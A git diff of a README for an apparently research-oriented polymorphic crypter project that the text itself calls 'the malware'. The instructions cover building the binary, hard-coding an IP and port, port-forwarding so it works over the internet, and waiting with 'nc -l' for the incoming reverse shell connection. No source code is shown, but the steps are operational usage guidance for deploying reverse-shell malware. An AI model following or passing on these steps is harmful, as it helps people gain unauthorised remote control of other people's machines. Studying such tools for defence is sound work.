@@ -9,12 +9,15 @@ To know what to crypt or where to find the key for instance, we used [sections (
 
 # How to use :
 
+The CRYPTED_FUNC_SIZE must be the exact size of your new section ! You can use `size -d -A binaryname` to get it.
+
 First one, you need to refer your IP and a Port to use, in `src/main.c` line 74 and 68.
 For use it over internet, use your public IP and make a port forward on your local computer's IP with the associate Port.
 
      git clone https://github.com/PoCFrance/Whitecomet-Research.git
-     cd PoCrypt
-	 make re
+     cd Polymorphic
+     make re
+     ./PoCrypt
 
 Now you get a binary named "**Pocrypt**" this is the malware.
 On your device use `nc -l [port]` for waiting the reverse shell connexion.
